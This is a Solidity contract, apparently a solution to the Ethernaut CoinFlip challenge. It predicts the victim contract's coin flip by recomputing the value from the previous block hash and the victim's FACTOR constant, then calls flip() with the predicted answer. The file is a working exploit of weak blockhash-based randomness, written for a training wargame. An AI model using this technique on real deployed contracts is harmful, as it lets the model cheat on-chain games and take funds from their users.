// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./CoinFlip.sol";

contract CoinFlipAttack {

    //Moving the victim contract to a variable
    CoinFlip public victimContract;
    //Check the variables of the victim contract:
    //.- We need to bring all the constant to use them here:
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //We have the victim´s contract code in a variable. 
    //.- Now we need the victims contract address ans pass it to the variable:
    //.- As is an Ethernaut Challenge, we will use the Instance Address
    constructor (address _victimContractAddress) {
        victimContract = CoinFlip(_victimContractAddress);
    }

    //03_CoinFlip.sol execute the function flip()
    //The key concept is:
    //.- flip(bool) use FACTOR => we already have it.
    //.- flip(bool) use block.number => we have to know before calling flip()
    //.- Once we know, we calculate the result: true or false
    //.- We call flip(bool) with the result
    function flipAttack () public {
        //Calculating result with the same method as flip()
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        //Now we guess the result
        bool side = coinFlip == 1 ? true : false;

        //Now we call flip() but sending the already calculated result
        victimContract.flip(side);

    }



}